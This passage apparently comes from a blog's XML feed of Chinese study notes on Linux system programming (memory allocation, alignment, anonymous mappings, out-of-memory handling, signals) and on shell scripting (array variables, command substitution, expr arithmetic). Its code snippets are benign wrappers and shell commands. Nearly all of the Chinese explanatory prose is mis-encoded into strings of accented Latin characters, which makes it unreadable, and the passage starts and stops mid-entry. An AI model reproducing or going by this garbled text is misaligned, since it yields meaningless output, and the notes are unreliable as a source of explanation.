address space)æ˜¯çº¿æ€§çš„ï¼Œä»0å¼€å§‹ï¼Œåˆ°æŸä¸ªæœ€å¤§å€¼ã€‚</p><h3 id="8-1-1-é¡µå’Œé¡µé¢è°ƒåº¦"><a href="#8-1-1-é¡µå’Œé¡µé¢è°ƒåº¦" class="headerlink" title="8.1.1 é¡µå’Œé¡µé¢è°ƒåº¦"></a>8.1.1 é¡µå’Œé¡µé¢è°ƒåº¦</h3><p>è™šæ‹Ÿç©ºé—´ç”±è®¸å¤šé¡µç»„æˆã€‚</p><p>æ¯ä¸ªé¡µé¢éƒ½åªæœ‰æ— æ•ˆ(invalid)å’Œæœ‰æ•ˆ(valid)ä¸¤ç§çŠ¶æ€ã€‚</p><p>ä¸€èˆ¬æ¥è¯´è™šæ‹Ÿå­˜å‚¨å™¨æ€»æ¯”ç‰©ç†å†…å­˜å¤§ã€‚</p><h3 id="8-1-2-å­˜å‚¨å™¨åŒºåŸŸ"><a href="#8-1-2-å­˜å‚¨å™¨åŒºåŸŸ" class="headerlink" title="8.1.2 å­˜å‚¨å™¨åŒºåŸŸ"></a>8.1.2 å­˜å‚¨å™¨åŒºåŸŸ</h3><p>å†…æ ¸å°†å…·æœ‰æŸäº›ç›¸åŒç‰¹å¾çš„é¡µç»„ç»‡æˆå—(blocks), è¿™äº›å—å«åšå­˜å‚¨å™¨åŒºåŸŸ(memory regions), æ®µ(segments), æˆ–è€…æ˜ å°„(mappings).</p><p>åœ¨æ¯ä¸ªè¿›ç¨‹ä¸­éƒ½å¯ä»¥è§åˆ°çš„å­˜å‚¨å™¨åŒºæ®µ:</p><pre><code class="hljs">  - æ–‡æœ¬æ®µ(text segment).  - å †æ ˆæ®µ(stack).  - æ•°æ®æ®µ(data segment)ï¼Œåˆå«å †(heap).  - BSSæ®µ(bss segment).  - å¤§å¤šæ•°åœ°å€ç©ºé—´å«æœ‰å¾ˆå¤šæ˜ å°„æ–‡ä»¶.</code></pre><h2 id="8-2-åŠ¨æ€å†…å­˜åˆ†é…"><a href="#8-2-åŠ¨æ€å†…å­˜åˆ†é…" class="headerlink" title="8.2 åŠ¨æ€å†…å­˜åˆ†é…"></a>8.2 åŠ¨æ€å†…å­˜åˆ†é…</h2><p>Cä¸æ”¯æŒåŠ¨æ€å†…å­˜çš„å˜é‡ã€‚</p><p>Cæä¾›äº†ä¸€ç§æœºåˆ¶åœ¨åŠ¨æ€å†…å­˜ä¸­åˆ†é…ä¸€ä¸ªè¶³å¤Ÿå¤§çš„ç©ºé—´ä¿å­˜ç»“æ„ä½“<code>pirate_ship</code>.</p><p>è°ƒç”¨<code>malloc()</code>æ—¶ï¼ŒCéƒ½ä¼šè‡ªåŠ¨åœ°æŠŠè¿”å›å€¼ç”±voidæŒ‡é’ˆè½¬å˜ä¸ºéœ€è¦çš„ç±»å‹ï¼Œä½†æ˜¯C++å¹¶ä¸æä¾›è¿™ç§è‡ªåŠ¨è½¬æ¢ã€‚</p><p>è®¸å¤šç¨‹åºéƒ½å®šä¹‰å’Œä½¿ç”¨å°è£…åçš„<code>malloc()</code>, å½“<code>malloc()</code>è¿”å›NULLæ—¶å°±æ‰“å°é”™è¯¯å’Œç»ˆæ­¢ç¨‹åºï¼Œæ ¹æ®çº¦å®šï¼Œç¨‹åºå‘˜ä»¬æŠŠè¿™ä¸ªå°è£…å«åš<code>xmalloc()</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/* like malloc(), but terminates on failure */</span><br>void *xmalloc(size_t size)<br>&#123;<br>  void *p;<br>  p = malloc(size);<br>  <span class="hljs-keyword">if</span> (!p) &#123;<br>    perror(<span class="hljs-string">&quot;xmalloc&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(EXIT_FAILURE);<br>  &#125;<br>  return p;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-2-1-æ•°ç»„åˆ†é…"><a href="#8-2-1-æ•°ç»„åˆ†é…" class="headerlink" title="8.2.1 æ•°ç»„åˆ†é…"></a>8.2.1 æ•°ç»„åˆ†é…</h3><p><code>calloc</code>å°†åˆ†é…åŒºåŸŸå…¨éƒ¨ç”¨0è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>å¯å®šä¹‰ä¸€ä¸ªç®€å•çš„æ¥å£:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">malloc0</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-2-2-è°ƒæ•´å·²åˆ†é…å†…å­˜å¤§å°"><a href="#8-2-2-è°ƒæ•´å·²åˆ†é…å†…å­˜å¤§å°" class="headerlink" title="8.2.2 è°ƒæ•´å·²åˆ†é…å†…å­˜å¤§å°"></a>8.2.2 è°ƒæ•´å·²åˆ†é…å†…å­˜å¤§å°</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure><p>å¦‚æœsizeæ˜¯0, æ•ˆæœå°±ä¼šè·Ÿåœ¨pträ¸Šè°ƒç”¨free()ç›¸åŒã€‚</p><p>å¦‚æœptræ˜¯NULLï¼Œç»“æœå°±ä¼šè·Ÿmalloc()ä¸€æ ·ã€‚</p><h3 id="8-2-3-åŠ¨æ€å†…å­˜çš„é‡Šæ”¾"><a href="#8-2-3-åŠ¨æ€å†…å­˜çš„é‡Šæ”¾" class="headerlink" title="8.2.3 åŠ¨æ€å†…å­˜çš„é‡Šæ”¾"></a>8.2.3 åŠ¨æ€å†…å­˜çš„é‡Šæ”¾</h3><p>è‡ªåŠ¨å†…å­˜åˆ†é…ï¼Œå½“æ ˆä¸åœ¨ä½¿ç”¨ï¼Œç©ºé—´è¢«è‡ªåŠ¨é‡Šæ”¾ã€‚</p><p>åŠ¨æ€å†…å­˜å°†æ°¸ä¹…å æœ‰ä¸€ä¸ªè¿›ç¨‹åœ°å€ç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼Œç›´åˆ°å®ƒè¢«æ˜¾å¼åœ°é‡Šæ”¾ã€‚</p><p>å½“æ•´ä¸ªè¿›ç¨‹éƒ½é€€å‡ºæ—¶ï¼Œæ‰€æœ‰åŠ¨æ€å’Œé™æ€çš„å­˜å‚¨å™¨éƒ½è¡ç„¶æ— å­˜ã€‚ </p><p>è°ƒç”¨free()æ—¶å¹¶ä¸éœ€è¦æ£€æŸ¥ptræ˜¯å¦ä¸ºNULL.</p><h3 id="8-2-4-å¯¹é½"><a href="#8-2-4-å¯¹é½" class="headerlink" title="8.2.4 å¯¹é½"></a>8.2.4 å¯¹é½</h3><p>æ•°æ®çš„å¯¹é½(alignment)æ˜¯æŒ‡æ•°æ®åœ°å€å’Œç¡¬ä»¶ç¡®å®šçš„å†…å­˜å—ä¹‹é—´çš„å…³ç³»ã€‚</p><p>ä¸€ä¸ªå˜é‡çš„åœ°å€æ˜¯å®ƒå¤§å°çš„å€æ•°æ—¶ï¼Œå°±å«åšè‡ªç„¶å¯¹é½(naturally aligned).</p><p>åœ¨ç¼–å†™å¯ç§»æ¤çš„ä»£ç çš„æ—¶å€™ï¼Œå¯¹é½çš„é—®é¢˜ä¸€å®šè¦æ³¨æ„ï¼Œæ‰€æœ‰çš„ç±»å‹éƒ½åº”è¯¥ä¿æŒè‡ªç„¶å¯¹é½ã€‚</p><h4 id="8-2-4-1-é¢„å¯¹é½å†…å­˜çš„åˆ†é…"><a href="#8-2-4-1-é¢„å¯¹é½å†…å­˜çš„åˆ†é…" class="headerlink" title="8.2.4.1 é¢„å¯¹é½å†…å­˜çš„åˆ†é…"></a>8.2.4.1 é¢„å¯¹é½å†…å­˜çš„åˆ†é…</h4><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨å’ŒCåº“ä¼šè‡ªåŠ¨å¤„ç†å¯¹é½é—®é¢˜ã€‚</p><h4 id="8-2-4-2-å…¶å®ƒå¯¹é½é—®é¢˜"><a href="#8-2-4-2-å…¶å®ƒå¯¹é½é—®é¢˜" class="headerlink" title="8.2.4.2 å…¶å®ƒå¯¹é½é—®é¢˜"></a>8.2.4.2 å…¶å®ƒå¯¹é½é—®é¢˜</h4><p>éæ ‡å‡†ç±»å‹ï¼Œå››æ¡æœ‰ç”¨çš„è§„åˆ™:</p><pre><code class="hljs">- ä¸€ä¸ªç»“æ„çš„å¯¹é½è¦æ±‚å’Œå®ƒæˆå‘˜ä¸­æœ€å¤§çš„é‚£ä¸ªç±»å‹æ˜¯ä¸€æ ·çš„ã€‚- ç»“æ„ä½“ä¹Ÿå¼•å…¥äº†å¯¹å¡«å……çš„è¦æ±‚ï¼Œä»¥æ­¤æ¥ä¿è¯æ¯ä¸€ä¸ªæˆå‘˜éƒ½ç¬¦åˆå„è‡ªçš„å¯¹å…¶è¦æ±‚ã€‚æ³¨æ„ä¸€ä¸‹ç»“æ„ä½“ä¸­æˆå‘˜å˜é‡çš„é¡ºåº, æ¥å‡å°‘å¡«å……æ‰€å¯¼è‡´çš„ç©ºé—´æµªè´¹ã€‚- ä¸€ä¸ªè”åˆçš„å¯¹é½å’Œè”åˆé‡Œæœ€å¤§çš„ç±»å‹ä¸€è‡´ã€‚- ä¸€ä¸ªæ•°ç»„çš„å¯¹é½å’Œæ•°ç»„é‡Œçš„å…ƒç´ ç±»å‹ä¸€è‡´ã€‚</code></pre><h2 id="8-3-æ•°æ®æ®µçš„ç®¡ç†"><a href="#8-3-æ•°æ®æ®µçš„ç®¡ç†" class="headerlink" title="8.3 æ•°æ®æ®µçš„ç®¡ç†"></a>8.3 æ•°æ®æ®µçš„ç®¡ç†</h2><p>å †å’Œæ ˆçš„åˆ†ç•Œçº¿å«åšä¸­æ–­(break)æˆ–ä¸­æ–­ç‚¹(break point).</p><h2 id="8-4-åŒ¿åå­˜å‚¨å™¨æ˜ å°„"><a href="#8-4-åŒ¿åå­˜å‚¨å™¨æ˜ å°„" class="headerlink" title="8.4 åŒ¿åå­˜å‚¨å™¨æ˜ å°„"></a>8.4 åŒ¿åå­˜å‚¨å™¨æ˜ å°„</h2><p>å®ç°malloc()æœ€ç»å…¸æ–¹æ³•å°±æ˜¯å°†æ•°æ®æ®µåˆ†ä¸ºä¸€ç³»åˆ—çš„å¤§å°ä¸º2çš„å¹‚çš„å—ï¼Œè¿”å›æœ€å°çš„ç¬¦åˆè¦æ±‚çš„é‚£ä¸ªå—æ¥æ»¡è¶³è¯·æ±‚ã€‚</p><p>é‡Šæ”¾åˆ™æ˜¯ç®€å•çš„å°†è¿™å—åŒºåŸŸæ ‡è®°ä¸ºæœªä½¿ç”¨.</p><p>ä¸€ä¸ªåŒ¿åå†…å­˜æ˜ å°„åªæ˜¯ä¸€å—å·²ç»ç”¨0åˆå§‹åŒ–çš„å¤§çš„å†…å­˜å—ï¼Œä»¥ä¾›ç”¨æˆ·ä½¿ç”¨ï¼Œå…¶ä¸åŸºäºå †ã€‚å› å…¶å’ŒåŸºäºæ–‡ä»¶çš„æ˜ å°„ç›¸ä¼¼ï¼Œä½†å¹¶ä¸åŸºäºæ–‡ä»¶ï¼Œæ‰€ä»¥ç§°ä¸ºåŒ¿åã€‚</p><p>åŒ¿åå†…å­˜æ˜ å°„ç”¨äºæ»¡è¶³å¤§çš„åˆ†é…ã€‚</p><h3 id="8-4-1-åˆ›å»ºåŒ¿åå­˜å‚¨å™¨æ˜ å°„"><a href="#8-4-1-åˆ›å»ºåŒ¿åå­˜å‚¨å™¨æ˜ å°„" class="headerlink" title="8.4.1 åˆ›å»ºåŒ¿åå­˜å‚¨å™¨æ˜ å°„"></a>8.4.1 åˆ›å»ºåŒ¿åå­˜å‚¨å™¨æ˜ å°„</h3><h2 id="8-5-é«˜çº§å­˜å‚¨å™¨åˆ†é…"><a href="#8-5-é«˜çº§å­˜å‚¨å™¨åˆ†é…" class="headerlink" title="8.5 é«˜çº§å­˜å‚¨å™¨åˆ†é…"></a>8.5 é«˜çº§å­˜å‚¨å™¨åˆ†é…</h2><h2 id="8-6-è°ƒè¯•å†…å­˜åˆ†é…"><a href="#8-6-è°ƒè¯•å†…å­˜åˆ†é…" class="headerlink" title="8.6 è°ƒè¯•å†…å­˜åˆ†é…"></a>8.6 è°ƒè¯•å†…å­˜åˆ†é…</h2><h2 id="8-7-åŸºäºæ ˆçš„åˆ†é…"><a href="#8-7-åŸºäºæ ˆçš„åˆ†é…" class="headerlink" title="8.7 åŸºäºæ ˆçš„åˆ†é…"></a>8.7 åŸºäºæ ˆçš„åˆ†é…</h2><p>æ ˆï¼Œç”¨æ¥å­˜æ”¾ç¨‹åºçš„è‡ªåŠ¨å˜é‡(automatic variables).</p><h2 id="8-9-å­˜å‚¨å™¨æ“ä½œ"><a href="#8-9-å­˜å‚¨å™¨æ“ä½œ" class="headerlink" title="8.9 å­˜å‚¨å™¨æ“ä½œ"></a>8.9 å­˜å‚¨å™¨æ“ä½œ</h2><h2 id="8-10-å†…å­˜é”å®š"><a href="#8-10-å†…å­˜é”å®š" class="headerlink" title="8.10 å†…å­˜é”å®š"></a>8.10 å†…å­˜é”å®š</h2><h3 id="8-11-1-è¶…é‡ä½¿ç”¨å’Œå†…å­˜è€—å°½"><a href="#8-11-1-è¶…é‡ä½¿ç”¨å’Œå†…å­˜è€—å°½" class="headerlink" title="8.11.1 è¶…é‡ä½¿ç”¨å’Œå†…å­˜è€—å°½"></a>8.11.1 è¶…é‡ä½¿ç”¨å’Œå†…å­˜è€—å°½</h3><p>åˆ†é…åˆ°çš„å†…å­˜æ¯”å®é™…ç‰©ç†å†…å­˜ç”šè‡³æ¯”å¯ç”¨çš„äº¤æ¢ç©ºé—´å¤šå¾—å¤šå«è¶…é‡ä½¿ç”¨(overcommitment).</p><p>å½“è¶…é‡ä½¿ç”¨å¯¼è‡´å†…å­˜ä¸è¶³ä»¥æ»¡è¶³ä¸€ä¸ªè¯·æ±‚æ—¶, æˆ‘ä»¬å°±è¯´å‘ç”Ÿäº†å†…å­˜è€—å°½(OOM)(out of memory). ä¸ºäº†å¤„ç†OOMï¼Œå†…æ ¸ä¼šä½¿ç”¨killeræŒ‘é€‰ä¸€ä¸ªè¿›ç¨‹å¹¶ç»ˆæ­¢å®ƒã€‚</p><h1 id="ç¬¬ä¹ç« -ä¿¡å·"><a href="#ç¬¬ä¹ç« -ä¿¡å·" class="headerlink" title="ç¬¬ä¹ç«  ä¿¡å·"></a>ç¬¬ä¹ç«  ä¿¡å·</h1><p>ä¿¡å·æ˜¯æä¾›å¤„ç†å¼‚æ­¥äº‹ä»¶æœºåˆ¶çš„è½¯ä»¶ä¸­æ–­ã€‚</p><h2 id="9-1-ä¿¡å·æ¦‚å¿µ"><a href="#9-1-ä¿¡å·æ¦‚å¿µ" class="headerlink" title="9.1 ä¿¡å·æ¦‚å¿µ"></a>9.1 ä¿¡å·æ¦‚å¿µ</h2><p>ä¿¡å·æœ‰ä¸€ä¸ªéå¸¸æ˜ç¡®çš„ç”Ÿå‘½å‘¨æœŸã€‚</p><h3 id="9-1-1-ä¿¡å·æ ‡è¯†ç¬¦"><a href="#9-1-1-ä¿¡å·æ ‡è¯†ç¬¦" class="headerlink" title="9.1.1 ä¿¡å·æ ‡è¯†ç¬¦"></a>9.1.1 ä¿¡å·æ ‡è¯†ç¬¦</h3><p>æ¯ä¸ªä¿¡å·éƒ½æœ‰ä¸€ä¸ªä»¥<code>SIG</code>ä¸ºå‰ç¼€çš„ç¬¦å·åç§°ã€‚</p><p>è¿™äº›ä¿¡å·éƒ½åœ¨<code>&lt;signal.h&gt;</code>å¤´æ–‡ä»¶ä¸­å®šä¹‰çš„ã€‚</p><p>ä¿¡å·è¢«é¢„å¤„ç†ç¨‹åºç®€å•çš„å®šä¹‰ä¸ºæ­£æ•´æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªä¿¡å·éƒ½ä¸ä¸€ä¸ªæ­£æ•´æ•°æ ‡è¯†ç¬¦ç›¸å…³è”ã€‚</p><p>ä¸€ä¸ªå¥½çš„ç¨‹åºå‘˜å› è¯¥æ€»æ˜¯ä½¿ç”¨ä¿¡å·çš„å¯è¯»åç§°ã€‚</p><h2 id="9-2-åŸºæœ¬ä¿¡å·ç®¡ç†"><a href="#9-2-åŸºæœ¬ä¿¡å·ç®¡ç†" class="headerlink" title="9.2 åŸºæœ¬ä¿¡å·ç®¡ç†"></a>9.2 åŸºæœ¬ä¿¡å·ç®¡ç†</h2><h2 id="9-9-ç»“è®º"><a href="#9-9-ç»“è®º" class="headerlink" title="9.9  ç»“è®º"></a>9.9  ç»“è®º</h2><p>ä¿¡å·æ˜¯ä»å†…æ ¸æ¥å—è®¸å¤šé€šçŸ¥çš„å”¯ä¸€æ–¹å¼ã€‚</p><p>ä¿¡å·è¿˜æ˜¯UNIX(Linux)ç»ˆæ­¢è¿›ç¨‹å’Œç®¡ç†çˆ¶&#x2F;å­è¿›ç¨‹å…³ç³»çš„æ–¹å¼ã€‚</p><h1 id="ç¬¬åç« -æ—¶é—´"><a href="#ç¬¬åç« -æ—¶é—´" class="headerlink" title="ç¬¬åç«  æ—¶é—´"></a>ç¬¬åç«  æ—¶é—´</h1>]]></content>
    
    
    <categories>
      
      <category>Operate System</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux Command Line and Shell Scripting Bible Notes</title>
    <link href="/2022/07/17/Linux-Command-Line-and-Shell-Scripting-Bible-Notes/"/>
    <url>/2022/07/17/Linux-Command-Line-and-Shell-Scripting-Bible-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬å…­ç« -ä½¿ç”¨-Linux-ç¯å¢ƒå˜é‡"><a href="#ç¬¬å…­ç« -ä½¿ç”¨-Linux-ç¯å¢ƒå˜é‡" class="headerlink" title="ç¬¬å…­ç«  ä½¿ç”¨ Linux ç¯å¢ƒå˜é‡"></a>ç¬¬å…­ç«  ä½¿ç”¨ Linux ç¯å¢ƒå˜é‡</h1><h2 id="6-7-æ•°ç»„å˜é‡"><a href="#6-7-æ•°ç»„å˜é‡" class="headerlink" title="6.7 æ•°ç»„å˜é‡"></a>6.7 æ•°ç»„å˜é‡</h2><p>ç¯å¢ƒå˜é‡æœ‰ä¸€ä¸ªå¾ˆé…·çš„ç‰¹æ€§å°±æ˜¯, å®ƒä»¬å¯ä½œä¸ºæ•°ç»„ä½¿ç”¨.</p><p>è¦ç»™æŸä¸ªç¯å¢ƒå˜é‡è®¾ç½®å¤šä¸ªå€¼, å¯ä»¥æŠŠå€¼æ”¾åœ¨æ‹¬å·é‡Œ, å€¼ä¸å€¼ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">$ mytest=(<span class="hljs-literal">one</span> <span class="hljs-literal">two</span> <span class="hljs-literal">three</span> <span class="hljs-literal">four</span> <span class="hljs-literal">five</span>)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ç´¢å¼•å€¼å¼•ç”¨:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;mytest[2]&#125;</span></span><br></code></pre></td></tr></table></figure><p>ä» 0 å¼€å§‹.</p><p>è¦æ˜¾ç¤ºæ•´ä¸ªæ•°ç»„å˜é‡, å¯ç”¨æ˜Ÿå·ä½œä¸ºé€šé…ç¬¦æ”¾åœ¨ç´¢å¼•å€¼çš„ä½ç½®:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;mytest[*]&#125;</span></span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ unset æ¥åˆ é™¤æ•°ç»„ä¸­çš„æŸä¸ªå€¼, ä½†å…¶ä»–å…ƒç´ çš„ä½ç½®ä¸å˜, åªæ˜¯è¢«åˆ é™¤çš„è¿™ä¸ªå€¼çš„ä½ç½®æ­¤æ—¶çš„å€¼ä¸ºç©º:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">unset</span> mytest[2]</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ æ‰æ•´ä¸ªæ•°ç»„:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">unset</span> mytest</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬åä¸€ç« -æ„å»ºåŸºæœ¬è„šæœ¬"><a href="#ç¬¬åä¸€ç« -æ„å»ºåŸºæœ¬è„šæœ¬" class="headerlink" title="ç¬¬åä¸€ç«  æ„å»ºåŸºæœ¬è„šæœ¬"></a>ç¬¬åä¸€ç«  æ„å»ºåŸºæœ¬è„šæœ¬</h1><h2 id="11-4-ä½¿ç”¨å˜é‡"><a href="#11-4-ä½¿ç”¨å˜é‡" class="headerlink" title="11.4 ä½¿ç”¨å˜é‡"></a>11.4 ä½¿ç”¨å˜é‡</h2><p>å¤šä¸ªå‘½ä»¤åœ¨åŒä¸€è¡Œæ‰§è¡Œï¼Œä½¿ç”¨åˆ†å·éš”å¼€:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">date</span> ; <span class="hljs-built_in">who</span></span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ–‡æœ¬æ–‡ä»¶å¼€å¤´çš„æœ€å‰é¢ä¸¤ä¸ªå­—ç¬¦æ˜¯<code>#!</code>ï¼Œé‚£ä¹ˆåé¢è·Ÿç€çš„å°±æ˜¯ç”¨æ¥æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶çš„ç¨‹åºè·¯å¾„.</p><p>shell é€šè¿‡PATHç¯å¢ƒå˜é‡æ¥æŸ¥æ‰¾å‘½ä»¤.</p><p>å¼•ç”¨å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨shellä¸­ä½¿ç”¨å•ç‚¹æ“ä½œç¬¦:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./test1</span><br></code></pre></td></tr></table></figure><p>å¯¹äºæ–‡ä»¶è€Œè¨€ï¼Œå…¨æƒé™å€¼ä¸º666, å¯¹äºç›®å½•è€Œè¨€ï¼Œå…¨æƒé™å€¼ä¸º777.</p><p>é»˜è®¤æƒé™å€¼ä¸ºå…¨æƒé™å€¼å‡å»umaskå˜é‡çš„å€¼.</p><h3 id="11-4-2-ç”¨æˆ·å˜é‡"><a href="#11-4-2-ç”¨æˆ·å˜é‡" class="headerlink" title="11.4.2 ç”¨æˆ·å˜é‡"></a>11.4.2 ç”¨æˆ·å˜é‡</h3><p>åœ¨å˜é‡ã€ç­‰å·å’Œå€¼ä¹‹é—´ä¸èƒ½å‡ºç°ç©ºæ ¼.</p><p>shell è„šæœ¬ä¼šè‡ªåŠ¨å†³å®šå˜é‡å€¼çš„æ•°æ®ç±»å‹.</p><p>å¼•ç”¨ä¸€ä¸ªå˜é‡å€¼æ—¶éœ€è¦ä½¿ç”¨ç¾å…ƒç¬¦ï¼Œè€Œå¼•ç”¨å˜é‡æ¥å¯¹å…¶è¿›è¡Œèµ‹å€¼æ—¶ä¸è¦ä½¿ç”¨ç¾å…ƒç¬¦:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">value1</span>=<span class="hljs-number">10</span><br><span class="hljs-attr">value2</span>=<span class="hljs-variable">$value1</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰ç¾å…ƒç¬¦ï¼Œshellä¼šå°†å˜é‡åè§£é‡Šæˆæ™®é€šçš„æ–‡æœ¬å­—ç¬¦ä¸².</p><h3 id="11-4-3-å‘½ä»¤æ›¿æ¢"><a href="#11-4-3-å‘½ä»¤æ›¿æ¢" class="headerlink" title="11.4.3 å‘½ä»¤æ›¿æ¢"></a>11.4.3 å‘½ä»¤æ›¿æ¢</h3><p>å‘½ä»¤æ›¿æ¢å…è®¸ä½ å°†shellå‘½ä»¤çš„è¾“å‡ºèµ‹ç»™å˜é‡, æœ‰ä¸¤ä¸ªæ ¼å¼:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">åå¼•å·å­—ç¬¦<span class="hljs-comment">(`)</span><br>$<span class="hljs-comment">()</span>æ ¼å¼<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">testing</span>=`date`<br><span class="hljs-attr">testing</span>=$(date)<br></code></pre></td></tr></table></figure><p>å‘½ä»¤æ›¿æ¢ä¼šåˆ›å»ºä¸€ä¸ªå­shellæ¥è¿è¡Œå¯¹åº”çš„å‘½ä»¤.</p><h2 id="11-5-é‡å®šå‘è¾“å…¥å’Œè¾“å‡º"><a href="#11-5-é‡å®šå‘è¾“å…¥å’Œè¾“å‡º" class="headerlink" title="11.5 é‡å®šå‘è¾“å…¥å’Œè¾“å‡º"></a>11.5 é‡å®šå‘è¾“å…¥å’Œè¾“å‡º</h2><h2 id="11-7-æ‰§è¡Œæ•°å­¦è¿ç®—"><a href="#11-7-æ‰§è¡Œæ•°å­¦è¿ç®—" class="headerlink" title="11.7 æ‰§è¡Œæ•°å­¦è¿ç®—"></a>11.7 æ‰§è¡Œæ•°å­¦è¿ç®—</h2><h3 id="11-7-1-exprå‘½ä»¤"><a href="#11-7-1-exprå‘½ä»¤" class="headerlink" title="11.7.1 exprå‘½ä»¤"></a>11.7.1 exprå‘½ä»¤</h3><p>exprå‘½ä»¤å…è®¸åœ¨å‘½ä»¤è¡Œä¸Šå¤„ç†æ•°å­¦è¡¨è¾¾å¼:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">expr</span> 1 + 5</span><br></code></pre></td></tr></table></figure><p>å¯¹äºé‚£äº›å®¹æ˜“è¢«shellé”™è¯¯è§£é‡Šçš„å­—ç¬¦ï¼Œåœ¨å®ƒä»¬ä¼ å…¥exprå‘½ä»¤ä¹‹å‰ï¼Œéœ€è¦ä½¿ç”¨shellçš„è½¬ä¹‰å­—ç¬¦å°†å…¶æ ‡å‡ºæ¥:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">expr</span> 1 \* 5</span><br></code></pre></td></tr></table></figure><h3 id="11-7-2-ä½¿ç”¨æ–¹æ‹¬å·"><a href="#11-7-2-ä½¿ç”¨æ–¹æ‹¬å·" class="headerlink" title="11.7.2 ä½¿ç”¨æ–¹æ‹¬å·"></a>11.7.2 ä½¿ç”¨æ–¹æ‹¬å·</h3><p>åœ¨bashä¸­ï¼Œåœ¨å°†ä¸€ä¸ªæ•°å­¦è¿ç®—ç»“æœèµ‹ç»™æŸä¸ªå˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¾å…ƒç¬¦å’Œæ–¹æ‹¬å·($[ operation ])å°†æ•°å­¦è¡¨è¾¾å¼å›´èµ·æ¥:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>var1=<span class="hljs-variable">$[</span><span class="hljs-number">1</span> + <span class="hljs-number">5</span>]<br></code></pre></td></tr></table></figure><p>ä¸ç”¨æ‹…å¿ƒshellä¼šè¯¯è§£.</p><p>bash shell æ•°å­¦è¿ç®—ç¬¦åªæ”¯æŒæ•´æ•°è¿ç®—.</p><p>z shell 